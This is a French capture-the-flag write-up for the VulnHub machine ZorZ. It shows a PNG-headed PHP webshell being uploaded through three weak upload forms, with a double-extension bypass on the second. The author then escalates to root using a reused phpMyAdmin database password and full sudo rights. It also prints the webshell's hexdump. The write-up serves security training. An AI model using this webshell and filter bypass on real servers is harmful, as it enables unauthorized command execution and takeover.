# Solution du CTF ZorZ de VulnHub

[TopHatSec: ZorZ](https://vulnhub.com/entry/tophatsec-zorz,117/) fait partie de la même série que le CTF [Freshly](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Freshly%20de%20VulnHub.md). On va potentiellement rester sur notre fin aussi car il semble qu'il n'y ait rien prévu pour l'escalade de privilèges... mais sait-on jamais.

> This machine will probably test your web app skills once again.
> 
> There are 3 different pages that should be focused on (you will see!) If you solve one or all three pages, please send me an email and quick write up on how you solved each challenge.
> 
> Your goal is to successfully upload a webshell or malicious file to the server.
> 
> If you can execute system commands on this box, thats good enough!!! I hope you have fun!

On a une page d'index avec un formulaire d'upload. Je lance tout de même `feroxbuster` qui me trouve d'autres ressources :

```
301        9l       28w      318c http://192.168.56.90/javascript
301        9l       28w      318c http://192.168.56.90/phpmyadmin
403       10l       30w      293c http://192.168.56.90/server-status
200       15l       31w      367c http://192.168.56.90/
301        9l       28w      314c http://192.168.56.90/jQuery
301        9l       28w      316c http://192.168.56.90/uploads2
301        9l       28w      316c http://192.168.56.90/uploads3
200       15l       31w      367c http://192.168.56.90/index.html
200       16l       38w      457c http://192.168.56.90/index2.html
200        4l       10w       76c http://192.168.56.90/uploader.php
```

Manuellement et par logique je trouve aussi le dossier `uploads1` à la racine.

J'utilise généralement un shell PHP qui contient juste un entête PNG avec ensuite un appel à `system()`. Ce n'est pas une image valide mais le fichier peut passer quelques filtres.

Quoiqu'il en soit ici ça passe comme dans du beurre :

```
File is valid, and was successfully uploaded.

Here is some more debugging info:Array
(
    [upfile] => Array
        (
            [name] => shell.php
            [type] => application/x-php
            [tmp_name] => /tmp/phpeKXzw6
            [error] => 0
            [size] => 71
        )

)
```

Je retrouve mon shell dans le dossier `uploads1` et je peux par exemple faire exécuter la commande `id` :

`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

Le second formulaire d'upload semble plus restrictif :

> Success! image/png.Sorry, only JPG, JPEG, PNG & GIF files are allowed.Sorry, your file was not uploaded.

Je renomme seulement mon fichier en `shell.php.png` et là ça passe :

> Success! image/png.The file shell.php.png has been uploaded.

Il apprait dans `uploads2` et est bien interprété.

Le dernier formulaire d'upload est moins basique et se base sur jQuery. Quand on sélectionne le fichier ce dernier apparait d'abord en preview avec le protocole `data://` et il faut reclicker sur `upload` pour terminer.

Mon shell précédent s'upload sans difficultés bien qu'il rale un peu sur les dimensions de l'image.

Il est temps d'explorer le système.

`LinPEAS` me trouve un fichier de configuration `/etc/phpmyadmin/config-db.php` qui contient des identifiants :

```php
<?php
##
## database access settings in php format
## automatically generated from /etc/dbconfig-common/phpmyadmin.conf
## by /usr/sbin/dbconfig-generate-include
## Tue, 17 Feb 2015 20:54:38 -0500
##
## by default this file is managed via ucf, so you shouldn't have to
## worry about manual changes being silently discarded.  *however*,
## you'll probably also want to edit the configuration file mentioned
## above too.
##
$dbuser='phpmyadmin';
$dbpass='toor2600root';
$basepath='';
$dbname='phpmyadmin';
$dbserver='';
$dbport='';
$dbtype='mysql';
```

Le mot de passe fonctionne pour l'utilisateur `user` qui est admin car a toutes les autorisations sudo :

```
www-data@zorz:/tmp$ su user
Password: 
user@zorz:/tmp$ sudo -l
[sudo] password for user: 
Matching Defaults entries for user on zorz:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User user may run the following commands on zorz:
    (ALL : ALL) ALL
user@zorz:/tmp$ sudo su
root@zorz:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

Pour les curieux voici un hexdump de mon shell PHP :

```
00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
00000010  00 3c 3f 70 68 70 0a 73  79 73 74 65 6d 28 24 5f  |.<?php.system($_|
00000020  47 45 54 5b 22 63 6d 64  22 5d 29 3b 0a 3f 3e 0a  |GET["cmd"]);.?>.|
```

*Publié le 2 janvier 2023*
